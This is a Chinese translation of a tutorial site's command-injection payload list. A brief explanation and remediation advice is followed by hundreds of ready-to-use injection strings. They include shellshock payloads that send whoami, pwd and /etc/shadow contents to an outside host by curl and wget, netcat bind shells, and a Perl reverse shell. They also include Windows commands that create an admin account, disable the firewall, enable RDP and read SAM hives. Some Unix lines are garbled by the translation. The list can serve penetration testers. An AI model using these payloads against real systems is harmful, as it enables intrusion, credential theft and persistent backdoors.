# 命令注入有效载荷列表

> 原文：<https://kalilinuxtutorials.com/command-injection-payload-list/>

命令注入是一种攻击，其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。

当应用程序传递不安全的用户提供的数据(表单、cookies、HTTP 头等)时，命令注入攻击是可能的。)到系统外壳。

在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。命令注入攻击很大程度上是由于输入验证不充分造成的。

这种攻击不同于代码注入，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。

在命令注入中，攻击者扩展了应用程序的默认功能，即执行系统命令，而无需注入代码。

**也可阅读-[Catnip:自动化基本 Pentest 工具-为 Kali Linux](https://kalilinuxtutorials.com/catnip-pentest-kali-linux/)T3 设计**

**什么是 OS 命令注入？**

操作系统命令注入是一个严重的漏洞，使得攻击者能够完全控制受影响的网站和底层 web 服务器。

当应用程序将用户数据合并到它执行的操作系统命令中时，操作系统命令注入漏洞就会出现。攻击者可以操纵数据来运行他们自己的命令。这使得攻击者能够执行应用程序本身可以执行的任何操作，包括读取或修改其所有数据以及执行特权操作。

除了完全破坏 web 服务器本身之外，攻击者还可以利用命令注入漏洞将攻击转移到组织的内部基础设施中，从而有可能访问 web 服务器可以访问的任何系统。他们还可以在组织内建立一个持久的立足点，甚至在最初的漏洞被修复后继续访问被破坏的系统。

**描述:**

当应用程序将用户可控制的数据合并到由外壳命令解释器处理的命令中时，操作系统命令注入漏洞就会出现。如果用户数据没有经过严格验证，攻击者可以使用外壳元字符来修改所执行的命令，并注入将由服务器执行的任意其他命令。

操作系统命令注入漏洞通常非常严重，可能导致托管应用程序的服务器受损，或者应用程序自身的数据和功能受损。还可能将服务器用作攻击其他系统的平台。攻击的确切可能性取决于执行命令的安全上下文，以及该上下文对服务器上敏感资源拥有的权限。

**补课:**

如果可能，应用程序应该避免将用户可控制的数据合并到操作系统命令中。几乎在每种情况下，都有执行服务器级任务的更安全的替代方法，这些方法不能被操纵来执行除预期命令之外的其他命令。

如果认为不可避免地要将用户提供的数据合并到操作系统命令中，应该使用以下两层防御来防止攻击:

*   应该严格验证用户数据。理想情况下，应该使用特定可接受值的白名单。否则，应该只接受短的字母数字字符串。包含任何其他数据的输入，包括任何可能的 shell 元字符或空白，都应该被拒绝。
*   应用程序应该使用通过名称和命令行参数启动特定进程的命令 API，而不是将命令字符串传递给支持命令链和重定向的 shell 解释器。例如，Java API Runtime.exec 和 ASP.NET API 进程。Start 不支持外壳元字符。这种防御可以减轻

Unix:

**<！–# exec % 20 cmd = "/bin/cat % 20/etc/passwd "->
<！–# exec % 20 cmd = "/bin/cat % 20/etc/shadow "->
<！–# exec % 20 cmd = "/usr/bin/id；–>
<！–# exec % 20 cmd = "/usr/bin/id；–>
/index . html | id |
；id；
；id
；netstat-a；
；id；
| id
|/usr/bin/id
| id |
|/usr/bin/id |
| |/usr/bin/id |
| id；
| |/usr/bin/id；
；id |
；|/usr/bin/id |
\ n/bin/ls-al \ n
\ n/usr/bin/id \ n
\ NID \ n
\ n/usr/bin/id；
\ NID；
\ n/usr/bin/id |
\ NID |
；/usr/bin/id \ n
；id \ n
| usr/bin/id \ n
| NID \ n** `**id**``**/usr/bin/id**` **a)；id
a；id
a)；id；
一；id；
一)；id |
a；id |
a)| id
a | id
a)| id；
a | id
|/bin/ls-al
a)；/usr/bin/id
a；/usr/bin/id
a)；/usr/bin/id；
a；/usr/bin/id；
一)；/usr/bin/id |
a；/usr/bin/id |
a)|/usr/bin/id
a |/usr/bin/id
a)|/usr/bin/id；
a |/usr/bin/id
；系统(' cat % 20/etc/passwd ')
；系统(' id ')
；system('/usr/bin/id ')
% 0 ACAT % 20/etc/passwd
% 0A/usr/bin/id
% 0 aid
% 0A/usr/bin/id % 0A
% 0 aid % 0A
&ping-I 30 127 . 0 . 0 . 1&&ping-n 30 127 . 0 . 0 . 1id
% 0a id % 0a** `**id**` **$；/usr/bin/id**

窗口:

`|| | ; ' '" " "' & && %0a %0a%0d %0Acat%20/etc/passwd %0Aid %0a id %0a %0Aid%0A %0a ping -i 30 127.0.0.1 %0a %0A/usr/bin/id %0A/usr/bin/id%0A %2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1`#' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1`#\" |ping -n 21 127.0.0.1 %20{${phpinfo()}} %20{${sleep(20)}} %20{${sleep(3)}} a|id| a;id| a;id; a;id\n () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami`”
() { :;}; /bin/bash -c “curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=`pwd`”
() { :;}; /bin/bash -c “curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=`grep root /etc/shadow`”
() { :;}; /bin/bash -c “curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=`uname -a`”
() { :;}; /bin/bash -c “curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=`nc -lvvp 1234 -e /bin/bash`”
() { :;}; /bin/bash -c “curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=`nc -lvvp 1236 -e /bin/bash &`”
() { :;}; /bin/bash -c “curl http://135.23.158.130/.testing/shellshock.txt?vuln=5”
() { :;}; /bin/bash -c “sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6”
() { :;}; /bin/bash -c “sleep 1 && echo vulnerable 1”
() { :;}; /bin/bash -c “sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7”
() { :;}; /bin/bash -c “sleep 3 && echo vulnerable 3”
() { :;}; /bin/bash -c “sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8”
() { :;}; /bin/bash -c “sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9”
() { :;}; /bin/bash -c “sleep 6 && echo vulnerable 6”
() { :;}; /bin/bash -c “wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=`whoami`”
() { :;}; /bin/bash -c “wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=`pwd`”
() { :;}; /bin/bash -c “wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=`grep root /etc/shadow`”
() { :;}; /bin/bash -c “wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=`uname -a`”
() { :;}; /bin/bash -c “wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=`nc -lvvp 1235 -e /bin/bash`”
() { :;}; /bin/bash -c “wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=`nc -lvvp 1237 -e /bin/bash &`”
() { :;}; /bin/bash -c “wget http://135.23.158.130/.testing/shellshock.txt?vuln=4”
cat /etc/hosts
$(`cat /etc/passwd`)
cat /etc/passwd
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
| curl http://crowdshield.com/.testing/rce.txt
& curl http://crowdshield.com/.testing/rce.txt
; curl https://crowdshield.com/.testing/rce_vuln.txt
&& curl https://crowdshield.com/.testing/rce_vuln.txt
curl https://crowdshield.com/.testing/rce_vuln.txt
curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #’ |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\” |curl https://crowdshield.com/.testing/rce_vuln.txt
curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #’ |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\” |curl https://crowdshield.com/.testing/rce_vuln.txt
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
dir
| dir
; dir
$(`dir`)
& dir
&&dir
&& dir
| dir C:\
; dir C:\
& dir C:\
&& dir C:\
dir C:\
| dir C:\Documents and Settings*
; dir C:\Documents and Settings*
& dir C:\Documents and Settings*
&& dir C:\Documents and Settings*
dir C:\Documents and Settings*
| dir C:\Users
; dir C:\Users
& dir C:\Users
&& dir C:\Users
dir C:\Users
;echo%20”
echo ”// XXXXXXXXXXX
| echo “” > rfi.php
; echo “” > rfi.php
& echo “” > rfi.php
&& echo “” > rfi.php
echo “” > rfi.php
| echo “” > dir.php
; echo “” > dir.php
& echo “” > dir.php
&& echo “” > dir.php
echo “” > dir.php
| echo “” > cmd.php
; echo “” > cmd.php
& echo “” > cmd.php
&& echo “” > cmd.php
echo “” > cmd.php
;echo ”
echo ”// XXXXXXXXXXX
echo ”// XXXXXXXXXXX
| echo “use Socket;$i=”192.168.16.151”;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>;S”);open(STDOUT,”>;S”);open(STDERR,”>;S”);exec(“/bin/sh -i”);};” > rev.pl
; echo “use Socket;$i=”192.168.16.151”;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>;S”);open(STDOUT,”>;S”);open(STDERR,”>;S”);exec(“/bin/sh -i”);};” > rev.pl
& echo “use Socket;$i=”192.168.16.151”;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};” > rev.pl
&& echo “use Socket;$i=”192.168.16.151”;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};” > rev.pl
echo “use Socket;$i=”192.168.16.151”;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};” > rev.pl
() { :;}; echo vulnerable 10
eval(‘echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX’)
eval(‘ls’)
eval(‘pwd’)
eval(‘pwd’);
eval(‘sleep 5’)
eval(‘sleep 5’);
eval(‘whoami’)
eval(‘whoami’);
exec(‘echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX’)
exec(‘ls’)
exec(‘pwd’)
exec(‘pwd’);
exec(‘sleep 5’)
exec(‘sleep 5’);
exec(‘whoami’)
exec(‘whoami’);
;{$_GET[“cmd”]}
`id`
|id
| id
;id
;id|
;id;
& id
&&id
;id\n
ifconfig
| ifconfig
; ifconfig
& ifconfig
&& ifconfig
/index.html|id|
ipconfig
| ipconfig /all
; ipconfig /all
& ipconfig /all
&& ipconfig /all
ipconfig /all
ls
$(`ls`)
| ls -l /
; ls -l /
& ls -l /
&& ls -l /
ls -l /
| ls -laR /etc
; ls -laR /etc
& ls -laR /etc
&& ls -laR /etc
| ls -laR /var/www
; ls -laR /var/www
& ls -laR /var/www
&& ls -laR /var/www
| ls -l /etc/
; ls -l /etc/
& ls -l /etc/
&& ls -l /etc/
ls -l /etc/
ls -lh /etc/
| ls -l /home/*
; ls -l /home/*
& ls -l /home/*
&& ls -l /home/*
ls -l /home/*
*; ls -lhtR /var/www/ | ls -l /tmp ; ls -l /tmp & ls -l /tmp && ls -l /tmp ls -l /tmp | ls -l /var/www/*
; ls -l /var/www/*
& ls -l /var/www/*
&& ls -l /var/www/*
ls -l /var/www/*
\n
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=`whoami`
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=`whoami`
\n/bin/ls -al\n
| nc -lvvp 4444 -e /bin/sh|
; nc -lvvp 4444 -e /bin/sh;
& nc -lvvp 4444 -e /bin/sh&
&& nc -lvvp 4444 -e /bin/sh &
nc -lvvp 4444 -e /bin/sh
nc -lvvp 4445 -e /bin/sh &
nc -lvvp 4446 -e /bin/sh|
nc -lvvp 4447 -e /bin/sh;
nc -lvvp 4448 -e /bin/sh&
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
\necho INJECTX\nexit\n\033[2Asleep 5\n
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
| net localgroup Administrators hacker /ADD
; net localgroup Administrators hacker /ADD
& net localgroup Administrators hacker /ADD
&& net localgroup Administrators hacker /ADD
net localgroup Administrators hacker /ADD
| netsh firewall set opmode disable
; netsh firewall set opmode disable
& netsh firewall set opmode disable
&& netsh firewall set opmode disable
netsh firewall set opmode disable
netstat
;netstat -a;
| netstat -an
; netstat -an
& netstat -an
&& netstat -an
netstat -an
| net user hacker Password1 /ADD
; net user hacker Password1 /ADD
& net user hacker Password1 /ADD
&& net user hacker Password1 /ADD
net user hacker Password1 /ADD
| net view
; net view
& net view
&& net view
net view
\nid|
\nid;
\nid\n
\n/usr/bin/id\n
perl -e ‘print “X”x1024’
|| perl -e ‘print “X”x16096’
| perl -e ‘print “X”x16096’
; perl -e ‘print “X”x16096’
& perl -e ‘print “X”x16096’
&& perl -e ‘print “X”x16096’
perl -e ‘print “X”x16384’
; perl -e ‘print “X”x2048’
& perl -e ‘print “X”x2048’
&& perl -e ‘print “X”x2048’
perl -e ‘print “X”x2048’
|| perl -e ‘print “X”x4096’
| perl -e ‘print “X”x4096’
; perl -e ‘print “X”x4096’
& perl -e ‘print “X”x4096’
&& perl -e ‘print “X”x4096’
perl -e ‘print “X”x4096’
|| perl -e ‘print “X”x8096’
| perl -e ‘print “X”x8096’
; perl -e ‘print “X”x8096’
&& perl -e ‘print “X”x8096’
perl -e ‘print “X”x8192’
perl -e ‘print “X”x81920’
|| phpinfo()
| phpinfo()
{${phpinfo()}}
;phpinfo()
;phpinfo();//
‘;phpinfo();//
{${phpinfo()}}
& phpinfo()
&& phpinfo()
phpinfo()
phpinfo();
:phpversion();
`ping 127.0.0.1`
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
;${@print(md5(RCEVulnerable))};
${@print(“RCEVulnerable”)}
${@print(system($_SERVER[‘HTTP_USER_AGENT’]))}
pwd
| pwd
; pwd
& pwd
&& pwd
\r
| reg add “HKLM\System\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f
; reg add “HKLM\System\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f
& reg add “HKLM\System\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f
&& reg add “HKLM\System\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add “HKLM\System\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f
\r\n
route
| sleep 1
; sleep 1
& sleep 1
&& sleep 1
sleep 1
|| sleep 10
| sleep 10
; sleep 10
{${sleep(10)}}
& sleep 10
&& sleep 10
sleep 10
|| sleep 15
| sleep 15
; sleep 15
& sleep 15
&& sleep 15
{${sleep(20)}}
{${sleep(20)}}
{${sleep(3)}}
{${sleep(3)}}
| sleep 5
; sleep 5
& sleep 5
&& sleep 5
sleep 5
{${sleep(hexdec(dechex(20)))}}
{${sleep(hexdec(dechex(20)))}}
sysinfo
| sysinfo
; sysinfo
& sysinfo
&& sysinfo
;system(‘cat%20/etc/passwd’)
system(‘cat C:\boot.ini’);
system(‘cat config.php’);
system(‘cat /etc/passwd’);
|| system(‘curl https://crowdshield.com/.testing/rce_vuln.txt’);
| system(‘curl https://crowdshield.com/.testing/rce_vuln.txt’);
; system(‘curl https://crowdshield.com/.testing/rce_vuln.txt’);
& system(‘curl https://crowdshield.com/.testing/rce_vuln.txt’);
&& system(‘curl https://crowdshield.com/.testing/rce_vuln.txt’);
system(‘curl https://crowdshield.com/.testing/rce_vuln.txt’)
system(‘curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf’)
system(‘curl https://xerosecurity.com/.testing/rce_vuln.txt’);
system(‘echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX’)
systeminfo
| systeminfo
; systeminfo
& systeminfo
&& systeminfo
system(‘ls’)
system(‘pwd’)
system(‘pwd’);
|| system(‘sleep 5’);
| system(‘sleep 5’);
; system(‘sleep 5’);
& system(‘sleep 5’);
&& system(‘sleep 5’);
system(‘sleep 5’)
system(‘sleep 5’);
system(‘wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23’)
system(‘wget https://xerosecurity.com/.testing/rce_vuln.txt’);
system(‘whoami’)
system(‘whoami’);
test*; ls -lhtR /var/www/ test* || perl -e ‘print “X”x16096’
test* | perl -e ‘print “X”x16096’
test* & perl -e ‘print “X”x16096’
test* && perl -e ‘print “X”x16096’
test*; perl -e ‘print “X”x16096’
$(`type C:\boot.ini`)
&&type C:\boot.ini
| type C:\Windows\repair\SAM
; type C:\Windows\repair\SAM
& type C:\Windows\repair\SAM
&& type C:\Windows\repair\SAM
type C:\Windows\repair\SAM
| type C:\Windows\repair\SYSTEM
; type C:\Windows\repair\SYSTEM
& type C:\Windows\repair\SYSTEM
&& type C:\Windows\repair\SYSTEM
type C:\Windows\repair\SYSTEM
| type C:\WINNT\repair\SAM
; type C:\WINNT\repair\SAM
& type C:\WINNT\repair\SAM
&& type C:\WINNT\repair\SAM
type C:\WINNT\repair\SAM
type C:\WINNT\repair\SYSTEM
| type %SYSTEMROOT%\repair\SAM
; type %SYSTEMROOT%\repair\SAM
& type %SYSTEMROOT%\repair\SAM
&& type %SYSTEMROOT%\repair\SAM
type %SYSTEMROOT%\repair\SAM
| type %SYSTEMROOT%\repair\SYSTEM
; type %SYSTEMROOT%\repair\SYSTEM
& type %SYSTEMROOT%\repair\SYSTEM
&& type %SYSTEMROOT%\repair\SYSTEM
type %SYSTEMROOT%\repair\SYSTEM
uname
;uname;
| uname -a
; uname -a
& uname -a
&& uname -a
uname -a
|/usr/bin/id
;|/usr/bin/id|
;/usr/bin/id|
$;/usr/bin/id
() { :;};/usr/bin/perl -e ‘print \”Content-Type: text/plain\r\n\r\nXSUCCESS!\”;system(\”wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\”);’
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
| wget http://crowdshield.com/.testing/rce.txt
& wget http://crowdshield.com/.testing/rce.txt
; wget https://crowdshield.com/.testing/rce_vuln.txt
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
&& wget https://crowdshield.com/.testing/rce_vuln.txt
wget https://crowdshield.com/.testing/rce_vuln.txt
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
which curl
which gcc
which nc
which netcat
which perl
which python
which wget
whoami
| whoami
; whoami
‘ whoami
‘ || whoami
‘ & whoami
‘ && whoami
‘; whoami
” whoami
” || whoami
” | whoami
” & whoami
” && whoami
“; whoami
$(`whoami`)
& whoami
&& whoami
{{ get_user_file(“C:\boot.ini”) }}
{{ get_user_file(“/etc/hosts”) }}
{{ get_user_file(“/etc/passwd”) }}
{{4+4}}
{{4+8}}
{{person.secret}}
{{person.name}}
{1} + {1}
{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
{{[] .*_ Class **.** base **.** subclasses _* ()}}

**克隆现有存储库(使用 HTTPS 克隆)**

**root @ Ismail tasdelen:~ # git clone https://github . com/Ismail tasdelen/command-injection-payload-list . git**

**克隆现有存储库(使用 SSH 克隆)**

**root @ Ismail tasdelen:~ # git clone git @ github . com:Ismail tasdelen/command-injection-payload-list . git**

[**Download**](https://github.com/ismailtasdelen/command-injection-payload-list)